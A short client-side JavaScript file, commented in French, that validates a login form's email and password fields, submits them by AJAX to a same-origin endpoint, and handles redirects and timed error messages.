document.addEventListener("DOMContentLoaded", () => {

  const form = document.getElementById("loginConn");
  const emailInput = document.getElementById("email-fill");
  const passInput = document.getElementById("mdp-fill");
  const submitBtn = document.getElementById("button_submit");
  const errorCard = document.getElementById("error-card");

  if (!form || !emailInput || !passInput || !submitBtn) return;

  let errorTimeout = null;

  /* =========================
     RESET PAGE
  ========================= */
  window.addEventListener("pageshow", () => {
    resetForm();
    hideError();
  });

  /* =========================
     VALIDATION SIMPLE
  ========================= */
  function isEmailValid(value) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(value.trim());
  }


  function refreshButtonState() {
    const emailOk = isEmailValid(emailInput.value);
    const passOk = passInput.value.trim().length >= 4;
    submitBtn.disabled = !(emailOk && passOk);
  }

  emailInput.addEventListener("input", refreshButtonState);
  passInput.addEventListener("input", refreshButtonState);

  /* =========================
     SUBMIT AJAX
  ========================= */
  form.addEventListener("submit", async (e) => {
    e.preventDefault();

    hideError();

    const formData = new FormData(form);

    try {
      const response = await fetch("/?dest=info_conn_v1", {
        method: "POST",
        body: formData
      });

      const data = await response.json();
      
      if (data.success) {
        window.location.href = data.redirect;
      } else {
        showError(data.message || "Erreur de connexion");
        resetForm();
      }

    } catch (err) {
      showError("Erreur serveur, veuillez réessayer.");
      resetForm();
    }
  });

  /* =========================
     OUTILS
  ========================= */
  function showError(message) {
    if (!errorCard) return;

    errorCard.querySelector(".error-message").textContent = message;
    errorCard.classList.add("show");

    window.scrollTo({ top: 0, behavior: "smooth" });

    // cache automatiquement après 5s
    clearTimeout(errorTimeout);
    errorTimeout = setTimeout(() => {
      hideError();
    }, 5000);
  }

  function hideError() {
    if (!errorCard) return;
    errorCard.classList.remove("show");
  }

  function resetForm() {
    emailInput.value = "";
    passInput.value = "";
    submitBtn.disabled = true;
  }

});
